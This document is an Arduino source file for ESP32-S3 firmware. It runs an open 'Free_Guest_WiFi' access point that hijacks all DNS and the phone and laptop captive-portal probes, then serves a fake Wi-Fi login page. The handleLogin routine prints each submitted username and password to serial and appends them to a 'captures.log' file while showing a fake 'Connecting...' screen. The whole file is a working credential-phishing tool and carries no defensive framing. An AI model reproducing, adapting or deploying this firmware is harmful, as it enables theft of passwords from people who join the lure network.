/*
  ESP32-S3 High-Performance Captive Portal Firmware
  --------------------------------------------------
  Target Board: ESP32-S3 (16MB Flash, 8MB PSRAM)
  Framework:    Arduino IDE
  Dependencies: LittleFS, DNSServer, WebServer, WiFi
*/

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>

// AP Configuration
const char* AP_SSID = "Free_Guest_WiFi";
const char* AP_PASS = NULL; // Open AP

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

DNSServer dnsServer;
WebServer server(80);

// HTML Fallback String if LittleFS is not flashed
const char INDEX_HTML_FALLBACK[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Wi-Fi Login</title>
<style>
body{font-family:sans-serif;background:#0f172a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.card{background:#1e293b;padding:2rem;border-radius:12px;width:90%;max-width:360px;box-shadow:0 10px 25px rgba(0,0,0,0.5);}
h2{text-align:center;margin-bottom:1rem;}
input,button{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border-radius:6px;border:1px solid #334155;}
input{background:#0f172a;color:#fff;}
button{background:#2563eb;color:#fff;border:none;font-weight:bold;cursor:pointer;}
</style></head>
<body><div class="card"><h2>Wi-Fi Authentication</h2>
<form action="/login" method="POST">
<input type="text" name="identity" placeholder="Username / Email" required><br>
<input type="password" name="passcode" placeholder="Password" required><br>
<button type="submit">Connect</button>
</form></div></body></html>
)rawliteral";

bool isCaptivePortalRequest() {
  String host = server.hostHeader();
  if (host != "192.168.4.1" && host != "") {
    return true;
  }
  return false;
}

void handleRoot() {
  if (isCaptivePortalRequest()) {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
    return;
  }

  if (LittleFS.exists("/index.html")) {
    File file = LittleFS.open("/index.html", "r");
    server.streamFile(file, "text/html");
    file.close();
  } else {
    server.send(200, "text/html", INDEX_HTML_FALLBACK);
  }
}

void handleLogin() {
  String identity = server.arg("identity");
  String passcode = server.arg("passcode");

  Serial.println("=========================================");
  Serial.print("[Auth Entry Received] Identity: ");
  Serial.println(identity);
  Serial.print("[Auth Entry Received] Passcode: ");
  Serial.println(passcode);
  Serial.println("=========================================");

  // Append entry to LittleFS log file
  File logFile = LittleFS.open("/captures.log", FILE_APPEND);
  if (logFile) {
    logFile.printf("%s, %s\n", identity.c_str(), passcode.c_str());
    logFile.close();
  }

  String responseHTML = "<html><head><meta http-equiv='refresh' content='3;url=http://192.168.4.1/'></head>"
                         "<body style='background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding-top:20%;'>"
                         "<h2>Connecting...</h2><p>Authenticating your device. Please wait.</p></body></html>";
  server.send(200, "text/html", responseHTML);
}

void handleNotFound() {
  if (isCaptivePortalRequest()) {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
  } else {
    handleRoot();
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("\n--- ESP32-S3 Captive Portal System ---");

  // Initialize LittleFS
  if (!LittleFS.begin(true)) {
    Serial.println("[ERROR] LittleFS Mount Failed");
  } else {
    Serial.println("[OK] LittleFS Mounted Successfully");
  }

  // Configure SoftAP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(AP_SSID, AP_PASS);

  Serial.print("[OK] Access Point Started: ");
  Serial.println(AP_SSID);
  Serial.print("[OK] IP Address: ");
  Serial.println(WiFi.softAPIP());

  // DNS Captive Portal Redirection
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);

  // Web Server Routes
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);

  // Probe endpoint captures for Android, iOS, Windows
  server.on("/generate_204", handleRoot);
  server.on("/redirect", handleRoot);
  server.on("/hotspot-detect.html", handleRoot);
  server.on("/canonical.html", handleRoot);
  server.on("/connecttest.txt", handleRoot);

  server.onNotFound(handleNotFound);
  server.begin();

  Serial.println("[OK] HTTP & DNS Captive Portal Servers Started");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
